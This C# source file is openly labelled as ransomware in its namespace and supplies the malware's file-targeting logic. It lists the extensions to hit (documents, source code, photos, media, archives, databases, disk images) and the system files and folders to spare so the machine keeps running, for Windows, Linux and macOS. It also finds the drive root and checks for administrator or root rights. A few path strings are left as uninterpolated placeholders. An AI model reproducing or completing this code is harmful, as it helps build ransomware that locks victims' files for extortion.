using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Security.Principal;

namespace Ransomware.File;

public static partial class FileOptions
{
    public static readonly HashSet<string> ExceptionalFiles = new(StringComparer.OrdinalIgnoreCase)
    {
        "iconcache.db", "autorun.inf", "thumbs.db", "boot.ini",
        "ntuser.dat", "pagefile.sys", "swapfile.sys", ".DS_Store",
        ".Trash", ".bash_history", ".bashrc", ".profile"
    };

    public static readonly HashSet<string> AllowedFileExtensions = new(StringComparer.OrdinalIgnoreCase)
    {
        ".txt", ".csv", ".xml", ".json", ".html", ".css", ".cpp", ".cs", ".java", ".py", ".js", ".rb",
        ".go", ".php", ".asp", ".aspx", ".doc", ".docx", ".odt", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx",
        ".mdb", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".svg", ".psd", ".ico", ".mp3", ".wav",
        ".ogg", ".flac", ".mp4", ".avi", ".mkv", ".mov", ".zip", ".rar", ".tar", ".gz", ".7z", ".ai",
        ".sketch", ".yaml", ".ini", ".sln",
        ".md", ".rst", ".tex", ".ts", ".vue", ".swift", ".kt", ".dart", // Lập trình
        ".rtf", ".pages", ".numbers", ".key", ".epub", // Tài liệu
        ".raw", ".cr2", ".nef", ".arw", ".dng", ".heic", ".webp", // Hình ảnh
        ".aac", ".wma", ".m4a", ".webm", ".3gp", ".wmv", ".flv", // Âm thanh/video
        ".bz2", ".xz", ".iso", ".vhd", ".vhdx", ".sqlite", ".db", ".sql" // Nén/dữ liệu
    };

    public static bool ExceptionalFile(string fileName)
        => ExceptionalFiles.Contains(fileName);

    public static string Root()
        => RuntimeInformation.IsOSPlatform(OSPlatform.Windows) ? @"C:\" : "/";

    public static (bool isAdmin, int platform) IsAdmin()
    {
        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return (IsWindowsAdmin(), 1);

        if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux) ||
            RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
            return (GetUid() == 0, RuntimeInformation.IsOSPlatform(OSPlatform.Linux) ? 2 : 3);

        return (false, 0);
    }

    public static List<string> GetSkippedFolders()
    {
        (bool isAdmin, int platformId) = IsAdmin();

        if (platformId == 1) return GetWindowsSkippedFolders(isAdmin);
        if (platformId == 2) return GetLinuxSkippedFolders(isAdmin);
        if (platformId == 3) return GetMacSkippedFolders(isAdmin);

        return [];
    }

    private static List<string> GetWindowsSkippedFolders(bool isAdmin)
    {
        string userName = Environment.UserName;
        var directories = new List<string>
        {
            "C:\\Windows",
            "C:\\Program Files",
            "C:\\Program Files (x86)",
            "C:\\System Volume Information",
            "C:\\Boot",
            "C:\\EFI",
            "C:\\Recovery",
            "C:\\ProgramData",
            "C:\\$Recycle.Bin",
            "C:\\WinSxS",
            "C:\\PerfLogs",
            "C:\\$SysReset",
            "C:\\Config.Msi",
            "C:\\$WinREAgent",
            "C:\\Intel",
            "C:\\AMD",
            "C:\\NVIDIA",
            "C:\\ProgramData\\Microsoft\\Windows Defender",
            "C:\\Users\\Public",
            "C:\\Users\\Default",
            "C:\\Users\\All Users\\Start Menu",
            $"C:\\Users\\{userName}\\AppData\\Local\\Temp",
            $"C:\\Users\\{userName}\\AppData\\LocalLow", "C:\\Users\\{userName}\\AppData\\Roaming\\Microsoft\\Windows\\Recent",
            $"C:\\Users\\{userName}\\AppData\\Local\\Packages"
        };
        if (!isAdmin)
        {
            directories.AddRange(
            [
                $"C:\\Users\\{userName}\\SendTo",
                $"C:\\Users\\{userName}\\Cookies",
                $"C:\\Users\\{userName}\\Templates",
                $"C:\\Users\\{userName}\\AppData\\Local\\Application Data"
            ]);
        }
        return directories;
    }

    private static List<string> GetLinuxSkippedFolders(bool isAdmin)
    {
        var directories = new List<string>
        {
            "/usr", "/var", "/etc", "/bin", "/sbin",
            "/lib", "/lib64", "/boot", "/proc", "/sys",
            "/dev", "/tmp", "/var/tmp", "/lost+found",
            "/mnt", "/var/log", "/var/cache", "/var/spool",
            "/etc/ssl", "/home/{user}/.cache", "/home/{user}/.local"
        };
        if (!isAdmin) directories.Add("/root");
        return directories;
    }

    private static List<string> GetMacSkippedFolders(bool isAdmin)
    {
        var directories = new List<string>
        {
            "/System", "/usr", "/bin", "/sbin", "/etc",
            "/var", "/private", "/private/tmp", "/private/var/tmp",
            "/private/var/log", "/var/folders", "~/Library/Caches",
            "~/Library/Logs", "~/Library/Containers", "~/Library/Developer"
        };
        if (!isAdmin)
        {
            directories.AddRange(["~/Desktop", "~/Documents", "~/Downloads"]);
        }
        return directories;
    }

    [LibraryImport("libc", EntryPoint = "getuid")]
    private static partial uint GetUid();

    [SupportedOSPlatform("windows")]
    private static bool IsWindowsAdmin() =>
        new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
}